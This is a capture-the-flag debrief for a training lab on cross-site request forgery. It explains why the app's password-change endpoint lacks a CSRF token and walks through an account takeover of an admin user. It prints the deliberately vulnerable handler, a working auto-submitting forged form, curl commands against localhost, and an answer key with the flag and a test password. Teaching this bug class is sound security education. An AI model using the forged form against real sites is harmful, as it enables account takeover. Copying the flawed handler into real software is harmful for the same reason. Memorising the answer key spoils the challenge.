# 🔓 Masquerade Operation 03 — One Click · Ying ⚔ Melusi · WSTG-SESS-05

**Spoilers below.** If you haven't played yet, use [`CHALLENGER.md`](CHALLENGER.md) first.

## The one-sentence lesson

**A session cookie proves a browser is authenticated — it proves nothing about whether the
human behind that browser meant to send this specific request, and an app that never checks
for that second thing can be made to act on anyone's behalf with nothing more than a link they
clicked once.**

This mission gives you a real second account, same as Operation 02 — D. Cho's password is
genuine, generated at server startup, and there is no path to learning it except getting
D. Cho's own browser to reset it for you. You never see it typed anywhere. You never need to.

---

## Why this bug exists (the mental model)

Two ordinary, individually-reasonable facts combine to create CSRF:

1. **Browsers attach cookies to every request automatically**, based purely on which domain
   the request is going to — never based on whether the page that triggered the request has
   anything to do with that domain, and never based on whether a human actually clicked
   anything the app would recognize as "submit."
2. **A lot of apps treat "the request carried a valid session cookie" as the entire
   authorization check.** Nothing about a cookie says *this particular request reflects what
   the logged-in user actually wants* — a cookie just says *this browser has a session*.

Put those together and you get a genuine identity crisis for the server: a POST that changes
your password looks byte-for-byte identical whether you typed it into your own account
settings page, or whether a page that has nothing to do with this app quietly built that exact
same POST and your browser fired it for you, cookie included, without asking permission.

The fix is almost always some form of **"prove intent, not just identity."** A random,
per-session token that only the real page could have known to include is the classic version —
an attacker's page can forge the *shape* of a legitimate request perfectly, but it can't guess
a value it was never shown.

---

## The R6 framing

**Ying's** kit is built around exactly this shape of attack: Candela's decoys don't need her
hand on the trigger once they're placed — she plants them, and they detonate on their own,
disorienting a target who never saw the trigger being pulled. That's precisely what an
auto-submitting CSRF form is: Ying doesn't need to be at the keyboard when D. Cho's browser
actually fires the request. She only needs D. Cho to load the page once — everything after
that runs itself.

**Melusi's** Banshees exist to notice unauthorized movement and react to it automatically —
her entire kit is a detection system. The irony matches Operation 01 and 02 before it: a
defender built around "notice when something happens that shouldn't" is standing guard over an
app that never built an equivalent check into its own password-change logic. There's no
per-request alarm here at all — the endpoint doesn't ask "was this request actually meant for
me," it just asks "is somebody logged in," and answers yes to a forged request exactly as
readily as a real one.

---

## Walking through what you had to do (and what to notice)

### Step 1 — Establish the baseline with your own, honest login

Sign in as `support.agent` and look at the ticket queue. Nothing here is broken. That matters:
a fixation or CSRF report is stronger when it shows what correct, unremarkable use looks like
right next to the forged path.

### Step 2 — Capture the real password-change request

Somewhere behind a logged-in session, the ticket system lets a user change their own password.
Find it, and read it like an attacker would: full URL (including the query string — this app's
URL shape, `?p=process_change_password&id=1`, mirrors real ticket-system software from the
2010s almost exactly, right down to the query-parameter-based routing style), method, and every
field in the body (`new_password`, `confirm_password`, `submit`).

*What to pay attention to:* WSTG-SESS-05 testing always starts here — you can't forge a request
you haven't precisely characterized. Guessing field names from context is not the same as
capturing the real ones.

### Step 3 — Look for what's supposed to stop you, and confirm it isn't there

Compare the captured request against your notes' checklist: is there a token? A field with a
long, random, single-use-looking value that isn't one of the actual password fields? Is
anything about the response different per visit, the way a real synchronizer token would be?

*What to pay attention to:* this is the step that turns "I found a password-change request"
into "I found a CSRF finding." Plenty of apps have exactly this endpoint shape and are
completely safe, because of one field you haven't found here. Its absence is the entire
vulnerability — confirm it's actually absent, don't assume.

### Step 4 — Build a request that fires itself

An attacker never gets to fill out a form on the victim's behalf. Real delivery means: victim
clicks a link once, the page loads, and from that point on nothing further is required of
them. That means your PoC needs a hidden form carrying the real field names and values you
chose, plus something — a `<script>` block, an `onload` handler — that calls `.submit()` on
that form the instant the page is ready.

*What to pay attention to:* a form the victim has to click "submit" on themselves isn't really
forging anything — you've just built a slightly annoying page that asks politely. The entire
point of CSRF is that the victim's *only* action is loading the page.

### Step 5 — Deliver it, and read what actually changed

Hosting the page through the PoC Lab doesn't hand you a password on screen — you already know
it, you chose it. What you're actually confirming is that D. Cho's account, which you have
never once presented real credentials for, now has the password you picked.

*What to pay attention to:* the proof isn't "the page loaded ok." It's reaching an account you
were never given credentials for, using nothing but a password you invented yourself and a
request the real user never consciously sent.

### Step 6 — Walk in

Sign in as `d.cho` with the password from your PoC. If that works, you've reproduced the entire
real-world impact of this bug class: full account takeover of a privileged user, without
phishing a password, without XSS, without brute force — just one click on a link.

---

## The actual code behind it, in plain language

**1. The vulnerable endpoint checks *who*, never *why***

```python
@app.route(MASQ3_VULN_PATH, methods=["GET", "POST"])
def masq3_ticket():
    if request.method != "POST" or request.args.get("p") != "process_change_password":
        return redirect(url_for("masq3_dashboard"))
    who = session.get("masq3_user")
    if not who:
        return make_response("Not logged in.", 401)
    new_pw = request.form.get("new_password") or ""
    confirm_pw = request.form.get("confirm_password") or ""
    if not request.form.get("submit") or not new_pw or new_pw != confirm_pw:
        return make_response("Password change failed.", 400)
    MASQ3_PASSWORDS[who] = new_pw
    return redirect(url_for("masq3_dashboard"))
```

Every check in this function is about the *content* of the request (do the passwords match, is
`submit` present) or about *whether a session exists at all* (`session.get("masq3_user")`).
Nothing checks where the request came from, or whether the page that produced it was one this
app actually served. A correct version adds exactly one more check:

```python
# what SHOULD happen (not in this app):
token = request.form.get("csrf_token")
if not token or token != session.get("csrf_token"):
    return make_response("Invalid or missing CSRF token.", 403)
```

That token — random, generated per session, embedded in the real form when the app itself
renders it, and never guessable by a page that isn't the app — is the entire fix. An
attacker's forged form can copy every field name perfectly and still have nothing to put in
that one.

**2. The delivery simulation reads your HTML like a browser would — and nothing more**

```python
class Masq3PoCParser(HTMLParser):
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "form":
            self.form_found = True
            self.method = (attrs.get("method") or "get").strip().lower()
            self.action = attrs.get("action") or ""
        elif tag == "input" and self._in_form:
            name = attrs.get("name")
            if name:
                self.fields[name] = attrs.get("value", "")
```

This uses Python's standard-library `html.parser` — a tag-walker, not a browser or a JS
engine. It never executes your `<script>` block; it only checks that one exists and calls
`.submit()` somewhere in the raw text, then separately validates that the `<form>` itself has
the right `action`, `method`, and hidden fields. That split matters: the *shape* of your PoC is
checked exactly like a real browser would check it before submitting, while nothing you submit
ever actually runs anywhere.

**3. Reaching the flag never has a shortcut**

```python
@app.route("/masquerade/op3/dashboard")
def masq3_dashboard():
    who = session.get("masq3_user")
    ...
    if who == MASQ3_ADMIN_USER:
        mark_masq_solved(3)
        ...
```

`d.cho`'s password starts as `secrets.token_hex(16)` — generated once at process start, shown
to no one, guessable by no one. The *only* line in this entire app that ever changes it is
`MASQ3_PASSWORDS[who] = new_pw` inside the vulnerable endpoint above. There is no admin backdoor,
no hint, no alternate path. Reaching the admin dashboard is only possible by successfully
forcing that one line to run on D. Cho's behalf.

---

## Self-check — can you explain these without looking back up?

1. In one sentence, why does a valid session cookie prove identity but not *intent* — and why
   does that gap matter for exactly one class of endpoint (state-changing requests), not all of
   them?
2. What's the one missing server-side check that would close this bug completely, even with
   every other line of the app unchanged?
3. Why does a PoC that requires the victim to click a second "submit" button not really count
   as CSRF exploitation, even if it technically forges the same request?
4. The DEBRIEF for Operation 02 warned that CSRF tokens don't help if the app also has XSS.
   Why not — what can XSS get an attacker that CSRF alone can't?
5. Why does this challenge validate your PoC's *shape* (form action, method, fields) instead of
   just letting you type in a password directly? What would be lost if the "PoC Lab" were just
   a plain "set D. Cho's password" text box?

---

## Answer key (reference)

- **Your test account:** `support.agent` : `Ticket2024!` (baseline only — not the exploit)
- **Target account:** `d.cho`, Helpdesk Administrator — real password, generated at startup,
  never shown to the player
- **Vulnerable endpoint:** `POST /masquerade/op3/ticket/?p=process_change_password&id=1`
- **Required fields:** `new_password`, `confirm_password` (must match), `submit`
- **Root cause:** no CSRF token (or any other proof of intent) anywhere in the password-change
  handler — only a session cookie is checked
- **Flag:** `R6S{ying_reset_d_chos_password_with_one_click}`
- **Automated:** `python3 masquerade/op3/solver.py http://localhost:8000`

### Manual walkthrough

```bash
# 1) sign in as yourself, confirm the baseline
curl -s -c /tmp/masq3.cj -X POST http://localhost:8000/masquerade/op3/login \
  -d 'username=support.agent&password=Ticket2024!' -o /dev/null

# 2) build a real CSRF PoC -- hidden auto-submit form, our own chosen password
cat > /tmp/masq3_poc.html <<'HTML'
<html><body>
<form action="/masquerade/op3/ticket/?p=process_change_password&id=1" method="POST" id="csrf" name="csrf">
  <input type="hidden" name="new_password" value="PwnedByYing123!" />
  <input type="hidden" name="confirm_password" value="PwnedByYing123!" />
  <input type="hidden" name="submit" value="Change Password" />
</form>
<script>document.csrf.submit();</script>
</body></html>
HTML

# 3) deliver it -- D. Cho is modeled as opening it, the form fires itself
curl -s -X POST http://localhost:8000/masquerade/op3/host-poc \
  --data-urlencode "poc@/tmp/masq3_poc.html" -o /dev/null

# 4) walk in the front door
curl -s -c /tmp/masq3_admin.cj -X POST http://localhost:8000/masquerade/op3/login \
  -d 'username=d.cho&password=PwnedByYing123!' -o /dev/null
curl -s -b /tmp/masq3_admin.cj http://localhost:8000/masquerade/op3/dashboard | grep -o 'R6S{[^}]*}'
```

### Report language

- **Finding (WSTG-SESS-05):** The ticket system's password-change endpoint
  (`POST /ticket/?p=process_change_password&id=1`) performs a sensitive, state-changing action
  based solely on the presence of a valid session cookie, with no anti-CSRF token, Origin/Referer
  validation, or re-authentication of any kind. A remote attacker can host a page containing a
  hidden, auto-submitting form targeting this endpoint; any authenticated user who merely visits
  that page (one click, no further interaction) will have their password silently changed to a
  value the attacker chose, at which point the attacker can log in as that user directly.
  *CWE-352 — Cross-Site Request Forgery.*
- **Impact:** Full account takeover of any user lured into visiting the malicious page while
  authenticated, including administrative accounts — an attacker never needs to observe, guess,
  or steal a credential; they only need one click from an already-logged-in victim.
- **Remediation:** Implement a synchronizer (CSRF) token: a random, per-session value embedded
  in the legitimate form and required (and validated server-side) on every state-changing
  request. Additionally set the session cookie's `SameSite` attribute to `Strict` or `Lax`, and
  validate the `Origin`/`Referer` header as defense in depth. Note that CSRF tokens alone do not
  protect against an attacker who can also exploit XSS on the same origin — an XSS bug can read
  the token directly and forge the request anyway, so both classes of finding should be reported
  and remediated together where both are present.

---

**Next in this campaign:** Operation 04, *Signed, Not Sealed* — JWT authentication. Locked
until this one's cleared, revealed on Command the moment it is.
